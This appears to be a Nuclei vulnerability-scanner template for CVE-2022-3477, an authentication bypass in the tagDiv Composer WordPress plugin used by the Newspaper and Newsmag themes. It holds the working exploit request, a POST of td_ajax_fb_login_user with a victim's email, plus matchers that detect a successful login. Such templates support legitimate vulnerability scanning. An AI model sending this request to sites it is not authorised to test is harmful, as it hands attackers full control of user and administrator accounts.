http:
- matchers:
  - part: body
    type: word
    words:
    - '"success":"You have been successfully logged in!'
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=td_ajax_fb_login_user&user[email]={{email}}

    '
id: CVE-2022-3477
info:
  author: melmathari
  classification:
    cpe: cpe:2.3:a:newsmag_project:newsmag:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-3477
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.98097
    epss-score: 0.58344
  description: 'The tagDiv Composer WordPress plugin before 3.5, required by the Newspaper
    WordPress theme before 12.1 and Newsmag WordPress theme before 5.2.2, does not
    properly implement the Facebook login feature, allowing unauthenticated attackers
    to login as any user by just knowing their email address

    '
  impact: 'Unauthenticated attackers who know a user''s email address can bypass authentication
    through the Facebook login feature to gain complete access to any user account
    including administrator accounts on WordPress sites using tagDiv Composer.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: newsmag
    vendor: newsmag_project
    verified: true
  name: WordPress tagDiv Composer < 3.5 - Authentication Bypass
  reference:
  - https://wpscan.com/vulnerability/993a95d2-6fce-48de-ae17-06ce2db829ef
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3477
  remediation: Fixed in 3.5
  severity: critical
  tags: cve,cve2022,wordpress,wp-plugin,wpscan,wp,auth-bypass,tagdiv,vkev,vuln
variables:
  email: '{{email}}'
